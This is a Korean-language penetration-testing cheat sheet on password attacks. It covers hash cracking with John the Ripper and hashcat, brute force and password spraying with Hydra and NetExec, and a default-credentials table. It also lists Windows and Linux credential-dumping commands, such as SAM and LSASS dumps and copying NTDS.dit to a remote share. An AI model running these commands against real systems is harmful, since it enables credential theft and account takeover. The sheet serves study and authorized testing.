# 1. John The Ripper

### Single Crack Mode
```john --format=<hash_type> <hash or hash_file>```

### Wordlist Mode
```john --wordlist=<wordlist_file> --rules <hash_file>```

### Incremental Mode (문자 조합 사용)
```john --incremental <hash_file>```

### 해시 식별
- [JtR의 샘플 해시 문서](https://openwall.info/wiki/john/sample-hashes) 나 [PentestMonkey의 이 목록을](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) 참조
- [hashID](https://github.com/psypanda/hashID)와 같은 도구를 사용 : 
```$ hashid -j 193069ceb0461e1d40d216e32c79c704```

### 파일 Cracking
```
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
  또는
john --wordlist=<wordlist.txt> server_doc.hash
```
| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

- 툴 위치 검색 : ```$ locate *2john*```

<br/><br/>
# 2. Hashcat

- `-a`는 `attack mode`를 지정
- `-m`은 `hash type`를 지정
- `<hashes>`는 해시 문자열이거나 동일한 유형의 암호 해시를 하나 이상 포함
- `[wordlist, rule, mask, ...]`는 공격 모드에 따라 달라지는 추가 인수<br/>
```$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]```

### Hash types
1. [해시 예시](https://hashcat.net/wiki/doku.php?id=example_hashes) 목록
2. [hashID](https://github.com/psypanda/hashID)를 사용하면 `-m` 인수를 지정하여 hashcat 해시 유형 식별<br/>
```$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'```

### Dictionary attack
- 사전 공격(`-a 0`), MD5 해시(`-m 0`)<br/>
```$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt```

- 사전 공격으로 해독할 수 없을 경우, 룰(rule) 기반 공격 시도(예 : best64.rule)<br/>
```$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule```

### Mask attack
- 비밀번호 길이나 조합이 예측가능한 경우, 사용자 지정 문자 집합(`-a 3`) + 문자셋 조합

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |

```$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'```

### Custom Wordlists and Rules
```
ls /usr/share/hashcat/rules/
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```
```hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list```

### CeWL를 이용한 Wordlist 생성
- 깊이(`-d`), 단어의 최소 길이(`-m`), 검색된 단어의 소문자 저장(`--lowercase`), 그리고 결과를 저장할 파일(`-w`)<br/>
```cewl https://www.domain.com -d 4 -m 6 --lowercase -w inlane.wordlist```

<br/><br/>
# 3. Hunting for Encrypted Files

### SSH Key Cracking
- `grep`와 같은 도구로 SSH 개인키 검색<br/>
```$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null```
- SSH 키가 암호화되었는지 확인하기 위해 `ssh-keygen`을 사용하여 키를 읽어 봄<br/>
```ssh-keygen -yf ~/.ssh/id_ed25519```
```
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```

### Cracking Documents
```
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
```

### Cracking PDFs
```
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
```

### Cracking ZIP
```
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

### Cracking OpenSSL Encrypted Archives (예 : .gzip)
```
file GZIP.gzip 
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives
```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```

<br/><br/>
# 4. Remote Password Attacks

### NetExec(CrackMapExec) - WinRM
```netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
예) ```netexec winrm 192.168.1.1 -u user.list -p password.list```

### Evil-WinRM
```evil-winrm -i <target-IP> -u <username> -p <password>```<br/>
예) ```evil-winrm -i 192.168.1.1 -u user -p password```

### Hydra - SSH
```hydra -L user.list -P password.list ssh://192.168.1.1```

### Hydra - RDP
```hydra -L user.list -P password.list rdp://192.168.1.1```

### Hydra - SMB
```hydra -L user.list -P password.list smb://192.168.1.1```

### MSF - SMB (SMBv3)
```msf6 > use auxiliary/scanner/smb/smb_login```

### NetExec(CrackMapExec) - SMB Share
```crackmapexec smb 192.168.1.1 -u "user" -p "password" --shares```

### Smbclient
```smbclient -U user \\\\192.168.1.1\\SHARENAME```

<br/><br/>
# 5. Password 재사용 / 기본 Passwords

### Password spraying
```$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'```

### Credential Stuffing - Hydra
```hydra -C <user_pass.list> <protocol>://<IP>```

### Default Credentials
```
$ pip3 install defaultcreds-cheat-sheet
$ creds search linksys
```

[DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
| **Product/Vendor** | **Username** | **Password**                 |
| ------------------ | ------------ | ---------------------------- |
| Zyxel (ssh)        | zyfwp        | PrOw!aN_fXp                  |
| APC UPS (web)      | apc          | apc                          |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | system       | manager                      |
| Weblogic (web)     | weblogic     | weblogic1                    |
| Weblogic (web)     | WEBLOGIC     | WEBLOGIC                     |
| Weblogic (web)     | PUBLIC       | PUBLIC                       |
| Weblogic (web)     | EXAMPLES     | EXAMPLES                     |
| Weblogic (web)     | weblogic     | weblogic                     |
| Weblogic (web)     | system       | password                     |
| Weblogic (web)     | weblogic     | welcome(1)                   |
| Weblogic (web)     | system       | welcome(1)                   |
| Weblogic (web)     | operator     | weblogic                     |
| Weblogic (web)     | operator     | password                     |
| Weblogic (web)     | system       | Passw0rd                     |
| Weblogic (web)     | monitor      | password                     |
| Kanboard (web)     | admin        | admin                        |
| Vectr (web)        | admin        | 11_ThisIsTheFirstPassword_11 |
| Caldera (web)      | admin        | admin                        |
| Dlink (web)        | admin        | admin                        |
| Dlink (web)        | 1234         | 1234                         |
| Dlink (web)        | root         | 12345                        |
| Dlink (web)        | root         | root                         |
| JioFiber           | admin        | jiocentrum                   |
| GigaFiber          | admin        | jiocentrum                   |
| Kali linux (OS)    | kali         | kali                         |
| F5                 | admin        | admin                        |
| F5                 | root         | default                      |
| F5                 | support      |                              |
| ...                | ...          | ...                          |
|                    |              |                              |

[Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

<br/><br/>
# 5. Windows Local Password Attacks

## Attacking SAM
#### reg.exe로 Registry Hives 복사
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

#### Impacket's secretsdump.py로 Dumping Hashes
```secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```<br/>
secretsdump 출력 : (uid:rid:lmhash:nthash)

#### Hashcat으로 Cracking Hashes (NT Hash)
```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```

### Remote Dumping
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --lsa```<br/>
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --sam```<br/>

<br/><br/>
## Attacking Lsass
### PowerShell을 이용한 lsass.dmp
```
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Pypykatz를 사용하여 LSASS 프로세스 덤프
```pypykatz lsa minidump ./lsass.dmp```
<br/><br/>
## Attacking NTDS.dit
### Evil-WinRM, Vssadmin를 이용한 NTDS.dit 복사
```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\192.168.1.1\Share
```

### Crackmapexec를 이용한 NTDS.dit 덤프
```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --ntds```

<br/><br/>
## 자격증명 검색

### Lazagne 사용하여 자격증명 검색
```start lazagne.exe all```

### findstr 사용하여 자격증명 검색
```findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml```

<br/><br/>
# 6. Linux Local Password Attacks

## 파일 검색

### 구성 파일 검색
```for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

### 구성 파일에서 자격증명 검색 (예 : .cnf)
```for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done```

### DB 파일 검색
```for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done```

### 노트 검색 (확장자가 없는 파일 포함)
```find /home/* -type f -name "*.txt" -o ! -name "*.*"```

### 스크립트 검색
```for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done```

### Cronjobs 검색
```cat /etc/crontab```<br/>
```ls -la /etc/cron.*/```

### SSH Private Keys 검색
```grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"```

### SSH Public Keys 검색
```grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"```

### Bash History 확인
```tail -n5 /home/*/.bash*```

### Log에서 특정 문자열 검색
```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```
<br/><br/>
## Memory & Cache 검색

### Memory - Mimipenguin
```python3 mimipenguin.py```

### Memory - LaZagne
```python2.7 laZagne.py all```
<br/><br/>
## Browsers 검색

### Firefox에 저장된 자격증명 검색
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

### Firefox에 저장된 자격증명 Decrypt
```python3.9 firefox_decrypt.py```

### Browsers - LaZagne
```python3 laZagne.py browsers```
<br/><br/>
## Shadow 파일
- `$<type>$<salt>$<hashed>`

### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

### 저장된 오래된 비밀번호 확인
```cat /etc/security/opasswd```
<br/><br/>
## Shadow 파일

### Unshadow, Hashcat으로 Cracking
```
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Hashcat으로 MD5 Hash Cracking
```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```


